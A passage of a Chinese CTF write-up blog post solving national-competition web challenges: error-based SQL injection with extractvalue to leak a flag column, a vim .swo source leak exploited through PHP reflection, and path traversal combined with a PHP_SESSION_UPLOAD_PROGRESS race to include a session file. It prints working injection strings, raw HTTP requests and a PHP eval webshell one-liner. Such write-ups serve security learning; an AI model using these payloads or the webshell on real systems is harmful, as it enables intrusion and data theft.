using(id,username))c)))#</code><br>结果报错结果是，<code>username</code>这个字段名不在表里面，同样换成<code>password</code>字段名也不在表里，那就意味着<code>id</code>这个字段名在表里<br>如法炮制：<br><code>1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select * from(select * from flag a inner join (select * from flag)b using(id))c)))#</code><br>结果得到还有一个字段是no，还有一个字段可用，继续看看还有什么<br><code>1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select * from(select * from flag a inner join (select * from flag)b using(id,no))c)))#</code><br>出现了一个长串的字符，<code>Duplicate column name &#39;0b6bfa70-a819-4996-9992-fcb5302b8b26&#39;</code>，交了两次，发现这玩意儿并不是flag<br>于是查一查这个字段有什么，<code>1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select group_concat(0b6bfa70-a819-4996-9992-fcb5302b8b26)from flag)))#</code>，<code>Unknown column &#39;0b6bfa70&#39; in &#39;field list&#39;</code>，字段名里有减号不行啊，回想之前做过一道纯数字的字段也不行，当时是加上了<code>`</code>，于是字段名加上<code>`</code>，<br><code>1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select group_concat(`0b6bfa70-a819-4996-9992-fcb5302b8b26`)from flag)))#</code><br>出了</p>
<hr>
<h3 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h3><p>hint很明显说明是源码泄露，<code>www.zip</code>没有，<code>.git</code>没有，<code>.swp</code>还没有。<br>于是找到笔记：用vim编辑器编写文件时，会有一个添加后缀为.swp的文件，如果正常退出的话，该文件会被删除，而异常退出，该文件会被保留用以恢复该文件，多次异常退出不会覆盖，而是会生成新的，如<code>.swo</code>为后缀的文件。<br>swp没有就试试<code>.swo</code>，试试<code>.index.php.swo</code>，有了，但这内容啥也没有，既然还有看不到的，哪应该就是注释了，再分析以下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure>
<p><code>new ReflectionMethod($class, $method)</code>:反射回类和此方法，再加上获取注释，那就是：<code>ReflectionClass::getDocComment</code>，那么payload：<code>?rc=ReflectionMethod&amp;rb=a&amp;ra=User&amp;rd=getDocComment</code>，对<code>rb</code>的值进行爆破，把每一个类都试一下，看看返回长度，得到flag在方法<code>q</code>里的注释。<br>出题人偷懒石锤-&gt;<span class="exturl" data-url="aHR0cHM6Ly9yMHlhbnguY29tLzIwMjAvMTAvMjgvZnNsaC13cml0ZXVwLw==">原题</span></p>
<hr>
<h2 id="二卷"><a href="#二卷" class="headerlink" title="二卷"></a>二卷</h2><h3 id="midlle-source"><a href="#midlle-source" class="headerlink" title="midlle_source"></a>midlle_source</h3><p>这是一道文件包含题，但又在我传入的cf前面加上了文件名，那么就需要目录穿越，首先field用不上，接着试试：<code>cf=/../../../../../../etc/passwd</code>，有回显了，说明通过了<code>file_exists</code>函数的判段，那么我就可以读已知目录下的已知文件了，开搞，我就可以上传个文件，然后去文件包含，这里我利用到了<code>PHP_SESSION_UPLOAD_PROGRESS</code>，原因很简单，关于这个的信息我都知道了，因为经过尝试我发现了一个“<code>.listing</code>”，访问后，里面告诉我目录下有一个<code>you_can_seeeeeeee_me.php</code>，访问它，居然是<code>phpinfo</code>，于是我发现关于<code>session</code>的一切信息都在指向<code>PHP_SESSION_UPLOAD_PROGRESS</code>，同时还拿到了<code>session.save_path:    /var/lib/php/sessions/eejeebihfj</code>，这就可以直接文件包含了，因为传上去的文件名字叫<code>session_(PHPsession值)</code>：于是我开始构造上传文件信息，当然上传的文件是什么不重要，并且<code>disable_function</code>里面没有<code>var_dump</code>和<code>scanfir</code>，那就可以随便读目录了：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://123.60.215.249:26275/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>抓包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 目标url</span><br><span class="line">User-Agent: </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------817151834966202188529467789</span><br><span class="line">Content-Length: 406</span><br><span class="line">Origin: 本地</span><br><span class="line">Connection: close</span><br><span class="line">Referer: 本地</span><br><span class="line">Cookie: PHPSESSID=muhua</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------817151834966202188529467789</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">§1§&lt;?php var_dump(scandir(&quot;/etc/&quot;));echo &quot;&lt;br&gt;&quot;;?&gt;</span><br><span class="line">-----------------------------817151834966202188529467789</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;</span><br><span class="line">-----------------------------817151834966202188529467789--</span><br></pre></td></tr></table></figure>

<p>同时也构造了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 目标url</span><br><span class="line">User-Agent: </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 44</span><br><span class="line">Origin: 目标url</span><br><span class="line">Connection: close</span><br><span class="line">Referer: 目标url</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">cf=/../../../../../../var/lib/php/sessions/eejeebihfj/sess_muhua&amp;a=§1§</span><br></pre></td></tr></table></figure>
<p>然后同时爆破，因为phpinfo还写了<code>session.upload_progress.cleanup    On</code>，传上去的东西会被删除，竞争上传，一边上传一边读取，于是跑出<code>/etc/</code>下一大堆文件夹，结合题目描述，奇怪的文件夹，既然是奇怪的，那就是毫无逻辑的名字，于是尝试读<code>/etc/hccejfdhhc</code>，发现下面果然又有一个奇怪的文件夹，如此重复几次，终于读到<code>fl444444g</code>，然后就无法再读了，结合题目描述，这就是flag文件了，想读取也很简单，既然题目可以用<code>highlight_file()</code>，那就没被禁，于是写好直接跑，读出！<br>感谢大佬们的<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTlBGUy9wLzEzNzk1MTcwLmh0bWw=">文章</span></p>

      <div class="tags">
          <a href="/tags/writeup/" rel="tag"><i class="ic i-tag"></i> writeup</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2022-02-28 18:02:08" itemprop="dateModified" datetime="2022-02-28T18:02:08+08:00">2022-02-28</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="muhua WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="muhua Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="muhua PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>muhua <i class="ic i-at"><em>@</em></i>暮间的花园
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2021/05/28/%E8%BF%91%E6%9C%9F%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E7%9A%84wp/" title="近期部分赛题的wp">http://example.com/2021/05/28/近期部分赛题的wp/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2021/04/24/sqlilabtrain/" itemprop="url" rel="prev" data-background-image="http:&#x2F;&#x2F;smilemoon.top:8083&#x2F;img&#x2F;20210604_102554_86181783_p0.png" title="sqlilabs less-1-17">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>sqlilabs less-1-17</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2021/08/02/buu%E8%AE%B0%E5%BD%95(1)/" itemprop="url" rel="next" data-background-image="http:&#x2F;&#x2F;smilemoon.top:8083&#x2F;img&#x2F;92334011_p0.jpg" title="buu记录(1)">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>buu记录(1)</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ISCC2021"><span class="toc-number">1.</span> <span class="toc-text">ISCC2021</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%83%E6%AD%A6%E9%A2%98-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%9C%80%E5%90%8E%E7%9A%84%E5%80%94%E5%BC%BA"><span class="toc-number">1.1.</span> <span class="toc-text">[练武题]正则表达式最后的倔强</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#which-is-the-true-iscc"><span class="toc-number">1.2.</span> <span class="toc-text">which is the true iscc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow%E5%A4%A7%E7%89%9B%E6%9D%AF"><span class="toc-number">2.</span> <span class="toc-text">ctfshow大牛杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#check-in"><span class="toc-number">2.1.</span> <span class="toc-text">check_in</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSTC2021"><span class="toc-number">3.</span> <span class="toc-text">CSTC2021</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cstcweb1-ez-web"><span class="toc-number">3.1.</span> <span class="toc-text">cstcweb1:ez_web</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RED-HAT"><span class="toc-number">4.</span> <span class="toc-text">RED HAT</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Find-it"><span class="toc-number">4.1.</span> <span class="toc-text">Find_it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#websitemanger"><span class="toc-number">4.2.</span> <span class="toc-text">websitemanger</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#framework"><span class="toc-number">4.3.</span> <span class="toc-text">framework</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WICCTF"><span class="toc-number">5.</span> <span class="toc-text">WICCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hate-flag"><span class="toc-number">5.1.</span> <span class="toc-text">hate_flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Neepu"><span class="toc-number">6.</span> <span class="toc-text">Neepu</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#noob"><span class="toc-number">6.1.</span> <span class="toc-text">noob</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E4%BE%BF%E6%B3%A82-0"><span class="toc-number">6.1.1.</span> <span class="toc-text">随便注2.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E6%B3%84%E5%8F%AF%E5%87%BB"><span class="toc-number">6.1.2.</span> <span class="toc-text">有泄可击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%BC%BA%E5%A4%A7%E8%84%91"><span class="toc-number">6.1.3.</span> <span class="toc-text">最强大脑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">6.2.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gamebox"><span class="toc-number">6.2.1.</span> <span class="toc-text">gamebox</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">6.3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E5%8F%A4%E4%BB%A3%E5%8A%A0%E5%AF%86"><span class="toc-number">6.3.1.</span> <span class="toc-text">中国古代加密</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#newctf"><span class="toc-number">7.</span> <span class="toc-text">newctf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-1"><span class="toc-number">7.1.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyweb"><span class="toc-number">7.2.</span> <span class="toc-text">easyweb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#weblog"><span class="toc-number">7.2.1.</span> <span class="toc-text">weblog</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8"><span class="toc-number">7.2.1.1.</span> <span class="toc-text">反序列化逃逸</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">7.3.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">7.3.1.</span> <span class="toc-text">签到</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%BD%E8%B5%9B"><span class="toc-number">8.</span> <span class="toc-text">国赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8D%B7"><span class="toc-number">8.1.</span> <span class="toc-text">一卷</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-sql"><span class="toc-number">8.1.1.</span> <span class="toc-text">easy_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-source"><span class="toc-number">8.1.2.</span> <span class="toc-text">easy_source</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8D%B7"><span class="toc-number">8.2.</span> <span class="toc-text">二卷</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#midlle-source"><span class="toc-number">8.2.1.</span> <span class="toc-text">midlle_source</span></a></li></ol></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="muhua"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">muhua</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">13</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">5</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2021/04/24/sqlilabtrain/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2021/08/02/buu%E8%AE%B0%E5%BD%95(1)/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/09/12/phpcharact/" title="php特性部分知识点">php特性部分知识点</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/05/28/%E8%BF%91%E6%9C%9F%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E7%9A%84wp/" title="近期部分赛题的wp">近期部分赛题的wp</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/05/12/buu%E8%AE%B0%E5%BD%95(2)/" title="buu记录(2)">buu记录(2)</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/03/05/java%E5%8F%8D%E5%B0%84%E6%B5%85%E5%AD%A6/" title="java反射浅学">java反射浅学</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2020/12/14/%E5%AD%A6%E4%B9%A0ctf%E7%9A%84%E4%BD%93%E9%AA%8C%E4%B8%8E%E5%BF%83%E5%BE%97/" title="学习ctf的体验与心得">学习ctf的体验与心得</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/04/24/sqlilabtrain/" title="sqlilabs less-1-17">sqlilabs less-1-17</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/10/26/akp%E5%8F%8D%E7%BC%96%E8%AF%91/" title="apk反编译工具的安装及使用">apk反编译工具的安装及使用</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/08/02/buu%E8%AE%B0%E5%BD%95(1)/" title="buu记录(1)">buu记录(1)</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/09/20/sqlbypass/" title="sqlbypass">sqlbypass</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/09/28/(2)check_in_wp/" title="2021下半年的一些比赛部分题解">2021下半年的一些比赛部分题解</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">muhua @ Yume Shoka</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2021/05/28/近期部分赛题的wp/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)Booooom"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
